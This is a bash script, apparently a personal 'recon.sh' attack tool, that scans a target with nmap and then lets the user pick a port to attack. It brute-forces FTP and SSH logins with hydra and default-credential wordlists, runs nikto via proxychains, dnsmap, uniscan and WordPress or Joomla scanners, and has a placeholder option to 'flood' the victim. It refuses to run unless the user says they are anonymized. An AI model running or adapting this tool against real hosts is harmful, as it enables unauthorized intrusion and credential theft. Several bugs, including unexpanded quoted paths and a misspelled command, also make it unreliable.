#!/bin/bash
TARGET="$1"
currentdir=$(pwd)
FTP_WORDLIST='$currentdir/wordlists/ftp-default-userpass.txt'
SSH_WORDLIST='$currentdir/wordlists/ssh-default-userpass.txt'
USER_FILE='${currentdir}/wordlists/simple-users.txt'
PASS_FILE='${currentdir}/wordlists/password.lst'
MERGED_USERPASS='${currentdir}/wordlists/merged-userpass.txt'
MASTER_PASS='${currentdir}/wordlists/master_pass.list'
getip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
#How many threads to use for bruteforce ##
THREADS='1'
##

#Attack programs
# Location of nikto prgram #
niktodir='/home/$USER/nikto-master/program/'  # Where is the nikto directory???? #
nikprog="nikto.pl"  # What have you named nikto ie instead of nikto.pl  it becomes web
#Whatever you name nikto  always chmod +x newnam  # 
#End nikto stuff

# DNSMAP #
dnsmapdir="/usr/bin/dnsmap"
dnsprog="dnsmap"
# END DNSMAP 
# How are you going to flood the bitch #
flood='some commands and locations on how you want to flood the user'

# If you have any MASTER wordlists you wanna use ##
#rainbowtbl="/somedir/someplace/somefile"
#wordlist="/somedir/someplace/somefile"

RED='\033[91m'


### END VARIABLES ###
# Enable the script to be proxied


if [ -z $TARGET ]; then
	        echo -e "$RED--=[Usage: recon.sh <target> "
  exit
fi




# SCRIPT START #

# Is your network even secure? #

echo "Are you using network protection/anonymization Example;Direct to ISP or VPN/Proxy"

read -r -p "Are you anonymized? [y/N] " response     # If you chose yes show your ip and move on #
case "$response" in
    [yY][eE][sS]|[yY]) 
        echo " ${getip} is your ip"
    ;;
    *)  #If not secure,  exit script #
	echo "Ending script untill network/computer is secured"
       exit 0
    ;;
esac

#### ATTACK START ####

	echo " Initiating NMAP scan on $TARGET. "
       	  nmap -Pn $TARGET | grep open   # Get the ports from the ip  target


# Port attack selection #
read -r -p " Choose a port to attack " portresponse
  case "$portresponse" in 

	# FTP ATTACK #

	    21)
	echo "Time for an ftp attack.  Cracking against $TARGET"
        	hydra -C $MERGED_USERPASS $TARGET ftp -t $THREADS -e ns
;;
	# SSH ATTACK #

       	    22)  # If you type 22 Do this attack else do another attack 
   	echo "Time for an ssh bruteforce"
	        hydra -C $MERGED_USERPASS $TARGET ssh -t $THREADS -e ns
		hydra -L $MERGED_USERPASS -P $MASTER_PASS $TARGET ssh -t $THREADS -e ns
;;
         flood)
	echo " Flood the bitch " 
	echo "${flood}"
;;
     80|443|53)
	read -r -p " Enter Hostname :" web
		 /usr/bin/proxychains /usr/bin/perl $niktodir$nikprog -url $web > $currentdir/logs/nikto.log
			echo " Initiating dnsmap "
			dnsmap $web > $currentdir/logs/dnsmap.log
			echo " Time for uniscan " 
			unisan -qwgu $TARGET > $currentdir/logs/uniscan.log


		read -r -p " Is the TARGET running wordpress or joomla? [wps/joom]" response
		  case $response in 
	wps|wordpress)
		wpscan --url $web > $currentdir/logs/wpscan.log
		    ;;
	  joom|joomla)
		joomscan -u $web > $currentdir/logs/joomscan.log
	   	    ;;
		esac
;;	
	# SMTP ATTACK # 
	    23)
	echo " Nothing configured for smtp. Feel free to co configure it yourself"
;;
	*)
		echo " Either no attack for selected port, or something went wrong "

;;
esac



